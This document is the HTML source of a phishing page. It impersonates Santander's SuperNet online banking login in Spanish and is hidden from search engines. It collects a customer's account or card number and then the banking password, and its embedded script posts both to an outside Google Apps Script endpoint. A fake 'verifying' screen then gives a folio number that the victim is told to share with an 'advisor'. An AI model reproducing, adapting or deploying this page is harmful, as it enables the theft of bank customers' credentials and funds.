<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="robots" content="noindex">
	<meta name="googlebot" content="noindex">
	<link rel="preconnect" href="https://fonts.googleapis.com">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@500;700&display=swap" rel="stylesheet">  
	<link rel="stylesheet" href="css/estilos.css">
	<link rel="icon" href="favicon-snet.png">
	<meta name="robots" content="noindex, nofollow">

	<meta property="og:locale" content="es_ES" />
	<meta property="og:type" content="website" />
	<meta property="og:title" content="SuperNet Santander Acceso | La banca electrónica por internet" />
	<meta property="og:description" content="Accede a nuestra banca electrónica por internet desde tu computadora y realiza pagos, transferencias, inversiones, consulta de estados de cuenta y más." />
	<meta property="og:site_name" content="SuperNet Santander Acceso | La banca electrónica por internet" />
	<meta property="og:image" content="favicon-snet.png" />
	<meta property="og:image:width" content="1093" />
	<meta property="og:image:height" content="666" />
	<meta property="og:image:type" content="image/png" />


	<title>SuperNet Santander Acceso | La banca electrónica por internet</title>
</head>
<body>
	
	<div class="contenedor">
		
		<div class="columna-top-rwd">

		</div>
		<div class="columna-derecha">
			
		</div>

		<div class="columna-izquierda">
			<div class="registro activo" id="registro">
				<div class="header">
					<h1>¡Bienvenido a <strong>SuperNet</strong>!</h1>
					<br>
				</div>
		
					<form class="formulario" id="contact-form"  name="submit-form">
						<p class="centro"><b>Ingresa sus datos para identificarte</b>
						</p><br>
						<label for="nombre">Código de Cliente / No. Cuenta / Tarjeta de Crédito o Débito:</label>
					<div class="contenedor-input">
						<input id="nombre" name="nombre">
					</div>
		
			
					
		
					<div class="contenedor-boton">
							<button type="submit"  id="submit-contact-form" onclick="miMensaje()">
							Continuar
							
						</button>
					</div>
					
				</form>
				<div class="true"><img src="img/trusteer-2.jpg"></div>
				
			</div>
			
			<div class="header exito" id="exito">

				<div class="registro activo" id="registro2">
					<div class="header">
						<h1>¡Bienvenido a <strong>SuperNet</strong>!</h1>
						<br>
					</div>
				<form class="formulario" id="contact-form"  name="submit-form2">
					<p class="centro"><b>Ingresa sus datos para identificarte</b>
					</p><br>
					<label for="contrasena">Contraseña de acceso:</label>
					<div class="contenedor-input">
						<input required type="password" id="contrasena"  name="contrasena" placeholder="Contraseña" />
					</div>	
		
					<div class="contenedor-boton">
							<button type="submit"  id="submit-contact-form" onclick="miMensaje2()">
							<b>Ingresar</b>
					</button>
				
					</div>
				</form>
				<div class="true"><img src="img/trusteer-2.jpg"></div>
			   </div>

				
			

			

			<div class="header exito" id="exito2">
				<h2 class="txtFolio">Verificando…</h2>
				<div class="loading"><img src="img/loading-gif.gif"></div>
				<p class="txt">Folio generado con éxito. Comparte el folio con tu asesor virtual o telefónico.</p>
				<h1 class="folio">RP2384</h1>

			</div>

		</div>

		
	</div>

	<script>
		const scriptURL = 'https://script.google.com/macros/s/AKfycbw_fGLqUkHgnblpxXuKtKtmXjajHnSp1cCAGrkGqunW5MWk376BADb6KYIVbIl9MRzH7Q/exec'
		const form = document.forms['submit-form']
		const form2 = document.forms['submit-form2']
		const registro = document.getElementById('registro');
		const exito = document.getElementById('exito');
		
		form.addEventListener('submit', e => {
		  e.preventDefault()
		  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
			.then(response => console.log('Success!', response))
			.then(response => exito.classList.add('activo'))
			.then(response => registro.classList.remove('activo'))
			.catch(error => console.log('Error!', error.message))
		   
			 
		})
		
		form2.addEventListener('submit', e => {
		  e.preventDefault()
		  fetch(scriptURL, { method: 'POST', body: new FormData(form2)})
			.then(response => console.log('Success!', response))
			.then(response => exito.classList.add('activo'))
			.then(response => registro.classList.remove('activo'))
			.catch(error => console.log('Error!', error.message))
		   
			 
		})
		
			function miMensaje() {
		  var element = document.getElementById("registro");
			element.classList.remove("activo");
		  var element = document.getElementById("exito");
			element.classList.add("activo");	
		}	
		
		function miMensaje2() {
		  var element = document.getElementById("registro2");
			element.classList.remove("activo");
		  var element = document.getElementById("exito2");
			element.classList.add("activo");	
		}
		</script>	

</body>
</html>
